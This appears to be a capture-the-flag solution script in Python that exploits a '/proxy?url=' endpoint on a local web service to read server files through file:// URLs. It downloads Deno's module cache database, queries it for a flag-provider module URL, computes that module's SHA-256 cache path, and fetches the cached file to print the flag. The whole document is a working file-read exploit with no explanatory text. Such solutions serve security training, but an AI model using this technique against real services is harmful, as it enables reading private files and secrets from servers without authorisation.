import requests
import sqlite3
from hashlib import sha256

HOST = "localhost:8080"

# get module cache db
res = requests.get(f"http://{HOST}/proxy?url=file:///home/app/.cache/deno/dep_analysis_cache_v1")

open("temp.db", "wb").write(res.content)

# get url
con = sqlite3.connect("temp.db")
cur = con.cursor()
res = cur.execute("SELECT specifier FROM moduleinfocache WHERE specifier LIKE 'http://flag-provider:8080/%'")
url = res.fetchone()[0]

# calculate hash
path = url[len("http://flag-provider:8080"):]
cache_hash = sha256(path.encode()).hexdigest()

# get flag
res = requests.get(f"http://{HOST}/proxy?url=file:///home/app/.cache/deno/deps/http/flag-provider_PORT8080/{cache_hash}")

print(res.text)
